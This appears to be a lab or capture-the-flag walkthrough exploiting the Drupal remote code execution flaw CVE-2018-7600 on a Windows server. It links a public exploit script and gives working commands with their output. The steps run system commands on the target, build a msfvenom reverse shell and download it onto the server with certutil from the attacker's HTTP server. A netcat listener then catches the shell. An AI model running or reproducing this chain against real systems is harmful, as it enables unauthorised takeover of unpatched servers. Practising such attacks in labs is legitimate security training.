# CVE Description
Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to **execute arbitrary code** because of an issue affecting multiple subsystems with default or common module configurations.

# Payload
https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py

# Step to replicate
## Prepare the payload
Download the payload or click Raw -> Ctrl A + Ctrl C -> gedit drupal.py -> Ctrl + V  
Put drupal.py into /root/transfer/  

## Install required modules
*pip install requests*  
*pip install bs4*

## Test payload
Assumptions:  
Drupal server: http://10.129.170.253  
Attack Box: 10.10.16.18
      
*python3 drupal.py http://10.129.170.253 -c "whoami"*  
[*] Triggering exploit to execute:    
whoami                                                                            
nt authority\iusr                                          

OK so we know the payload works

## Exploitation steps
### Get system info
*python3 drupal.py http://10.129.170.253 -c 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"'*

OS Name:                   Microsoft Windows Server 2008 R2 Datacenter  
OS Version:                6.1.7600 N/A Build 7600  
System Type:               x64-based PC

So we know it is x64 system

### Generate reverse shell payload
Go to /root/transfer  
*msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.18 LPORT=443 -f exe > shell.exe*  

### Deliver the reverse shell payload to Drupal server

*python3 -m http.server 80*                                                          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

*python3 drupal.py http://10.129.170.253 -c 'mkdir c:\temp'*  

*python3 drupal.py http://10.129.170.253 -c 'certutil.exe -urlcache -f http://10.10.16.18/shell.exe c:\temp\shell.exe'*

Open a new Terminal  
*nc - nvlp 443*  

*python3 drupal.py http://10.129.170.253 -c 'c:\temp\shell.exe'*  

Back to the nc screen -> you should see a shell  
*C:\inetpub\drupal-7.54>whoami           
whoami                               
nt authority\iusr*